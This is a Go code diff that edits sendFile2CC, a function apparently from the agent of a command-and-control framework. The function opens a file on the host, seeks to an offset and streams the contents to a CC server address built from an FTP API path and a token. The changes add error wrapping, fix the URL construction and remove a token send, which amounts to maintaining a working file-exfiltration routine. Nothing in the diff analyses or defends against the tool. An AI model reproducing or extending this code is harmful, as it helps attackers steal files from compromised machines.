@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"bytes"
 	"encoding/base64"
+	"fmt"
 	"log"
 	"os"
 	"time"
@@ -45,20 +46,22 @@ func sendFile2CC(filepath string, offset int64, token string) (checksum string, 
 	// open and read the target file
 	f, err := os.Open(filepath)
 	if err != nil {
+		err = fmt.Errorf("sendFile2CC: failed to open %s: %v", filepath, err)
 		return
 	}
 	// seek offset
 	_, err = f.Seek(offset, 0)
 	if err != nil {
+		err = fmt.Errorf("sendFile2CC: failed to seek %d in %s: %v", offset, filepath, err)
 		return
 	}
 
 	// connect
-	url := CCAddress + "/" + tun.FTPAPI + token
+	url := CCAddress + tun.FTPAPI + "/" + token
 	conn, ctx, cancel, err := ConnectCC(url)
 	log.Printf("sendFile2CC: connection: %s", url)
 	if err != nil {
-		log.Printf("sendFile2CC: connection failed: %v", err)
+		err = fmt.Errorf("sendFile2CC: connection failed: %v", err)
 		return
 	}
 	defer cancel()
@@ -68,8 +71,6 @@ func sendFile2CC(filepath string, offset int64, token string) (checksum string, 
 		send = make(chan []byte, 1024)
 		buf  = make([]byte, 1024)
 	)
-	send <- []byte(token)
-	log.Printf("Sent token %s", token)
 	go func() {
 		for outgoing := range send {
 			outgoing = bytes.Trim(outgoing, "\x00") // trim NULL
